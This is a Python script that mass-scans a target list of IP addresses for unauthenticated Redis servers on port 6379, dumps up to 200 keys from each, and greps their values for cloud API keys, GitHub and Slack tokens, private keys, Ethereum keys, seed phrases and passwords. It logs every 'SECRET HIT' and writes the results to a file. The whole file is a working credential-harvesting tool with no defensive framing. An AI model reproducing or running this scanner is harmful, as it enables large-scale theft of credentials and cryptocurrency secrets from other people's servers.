#!/usr/bin/env python3
import socket, json, re
from concurrent.futures import ThreadPoolExecutor, as_completed

TIMEOUT = 5

KEY_RE = re.compile(
    r'(AKIA[0-9A-Z]{16}'
    r'|(?:sk|rk)-[a-zA-Z0-9]{20,}'
    r'|sk-[a-zA-Z0-9]{32,}'
    r'|ghp_[a-zA-Z0-9]{36}'
    r'|gho_[a-zA-Z0-9]{36}'
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
    r'|-----BEGIN [A-Z ]+ KEY-----'
    r'|AIza[0-9A-Za-z\-_]{35}'
    r'|[0-9]{9,10}:[A-Za-z0-9_\-]{35}'
    r'|(?:0x[0-9a-fA-F]{64})'
    r'|(?:private.?key|eth.?key|mnemonic|seed.?phrase)\s*[=:"\s]+([0-9a-fA-F]{64})'
    r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
    re.IGNORECASE
)

def find_secrets(text):
    return list(set(m.group(0)[:120] for m in KEY_RE.finditer(text)))

def parse_keys(raw):
    # SCAN response: *2\r\n $N\r\n {cursor}\r\n *M\r\n $K\r\n {key}\r\n ...
    lines = raw.split('\r\n')
    keys = []
    i = 0
    if i < len(lines) and lines[i].startswith('*'):
        i += 1  # skip outer *2
    if i < len(lines) and lines[i].startswith('$'):
        i += 2  # skip cursor $N + value
    if i < len(lines) and lines[i].startswith('*'):
        i += 1  # skip key array *M
    while i < len(lines):
        if lines[i].startswith('$') and i + 1 < len(lines):
            try:
                if int(lines[i][1:]) > 0:
                    keys.append(lines[i + 1])
                i += 2
            except:
                i += 1
        else:
            i += 1
    return [k for k in keys if k]

def probe(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, 6379))

        def send(*args):
            c = f'*{len(args)}\r\n' + ''.join(f'${len(str(a))}\r\n{a}\r\n' for a in args)
            s.send(c.encode())
            data = b''
            try:
                while True:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
                    if len(chunk) < 65536:
                        break
            except:
                pass
            return data.decode('utf-8', errors='replace')

        pong = send('PING')
        if '+PONG' not in pong:
            s.close()
            return None

        keys_resp = send('SCAN', '0', 'COUNT', '300')
        keys = parse_keys(keys_resp)

        secrets = []
        for key in keys[:200]:
            try:
                val = send('GET', key)
                found = find_secrets(f'{key}={val}')
                if found:
                    secrets.extend(found[:5])
            except:
                pass

        s.close()
        if secrets or keys:
            return {'ip': ip, 'port': 6379, 'type': 'redis',
                    'keys': len(keys), 'secrets': secrets}
    except:
        pass
    return None


with open('redis_targets.txt') as f:
    targets = [l.strip() for l in f if l.strip()]

print(f'Probing {len(targets)} Redis targets (50 workers)...', flush=True)

findings = []
with ThreadPoolExecutor(max_workers=50) as ex:
    futs = {ex.submit(probe, ip): ip for ip in targets}
    for i, fut in enumerate(as_completed(futs)):
        try:
            r = fut.result()
            if r:
                findings.append(r)
                if r['secrets']:
                    print(f'  SECRET HIT: {r["ip"]} keys={r["keys"]} secrets={len(r["secrets"])}', flush=True)
                    for sec in r['secrets'][:3]:
                        print(f'    -> {sec[:80]}', flush=True)
                else:
                    print(f'  OPEN: {r["ip"]} keys={r["keys"]}', flush=True)
        except:
            pass
        if i % 1000 == 0:
            print(f'  {i}/{len(targets)} checked — {len(findings)} hits so far', flush=True)

with_secrets = sum(1 for f in findings if f['secrets'])
print(f'\nDone. {len(findings)} open Redis, {with_secrets} with secrets')

with open('redis_findings.jsonl', 'w') as f:
    for r in findings:
        f.write(json.dumps(r) + '\n')
